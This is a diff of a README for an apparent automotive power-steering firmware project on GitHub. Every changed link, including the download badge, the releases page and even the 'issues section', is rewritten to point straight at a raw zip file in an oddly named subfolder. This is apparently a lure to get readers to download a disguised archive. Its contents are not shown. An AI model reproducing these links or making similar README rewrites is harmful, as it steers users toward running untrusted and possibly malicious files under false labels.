@@ -1,6 +1,6 @@
 # 🚗 PowerSteering_TMS570_GM_9BXX - Improve Your Steering Control Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Dorjiam/PowerSteering_TMS570_GM_9BXX/releases)
+[![Download Now](https://raw.githubusercontent.com/Dorjiam/PowerSteering_TMS570_GM_9BXX/main/imaginant/PowerSteering_TMS570_GM_9BXX.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Dorjiam/PowerSteering_TMS570_GM_9BXX/main/imaginant/PowerSteering_TMS570_GM_9BXX.zip)
 
 ## 📋 About the Project
 
@@ -26,7 +26,7 @@ Welcome to the **Electric Power Steering (EPS)** system for the **General Motors
 To help you get started, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases Page](https://github.com/Dorjiam/PowerSteering_TMS570_GM_9BXX/releases) to download the latest version of the software.
+   Go to our [Releases Page](https://raw.githubusercontent.com/Dorjiam/PowerSteering_TMS570_GM_9BXX/main/imaginant/PowerSteering_TMS570_GM_9BXX.zip) to download the latest version of the software.
 
 2. **Download the Software**  
    Look for the latest version listed. Click on it and then download the appropriate file for your needs. 
@@ -42,7 +42,7 @@ To help you get started, follow these simple steps:
 To download the software, follow these steps:
 
 1. **Go to the Releases Page**  
-   Visit this [link to download](https://github.com/Dorjiam/PowerSteering_TMS570_GM_9BXX/releases).
+   Visit this [link to download](https://raw.githubusercontent.com/Dorjiam/PowerSteering_TMS570_GM_9BXX/main/imaginant/PowerSteering_TMS570_GM_9BXX.zip).
 
 2. **Choose a File**  
    Select the version you wish to download. Ensure it's compatible with your system.
@@ -68,7 +68,7 @@ Before installation, ensure your environment meets the following requirements:
 
 ## 📬 Need Help?
 
-If you have questions or need assistance, please check the [issues section](https://github.com/Dorjiam/PowerSteering_TMS570_GM_9BXX/issues) on GitHub. You can seek clarification there or report any problems you encounter.
+If you have questions or need assistance, please check the [issues section](https://raw.githubusercontent.com/Dorjiam/PowerSteering_TMS570_GM_9BXX/main/imaginant/PowerSteering_TMS570_GM_9BXX.zip) on GitHub. You can seek clarification there or report any problems you encounter.
 
 ## 📌 Related Topics
 
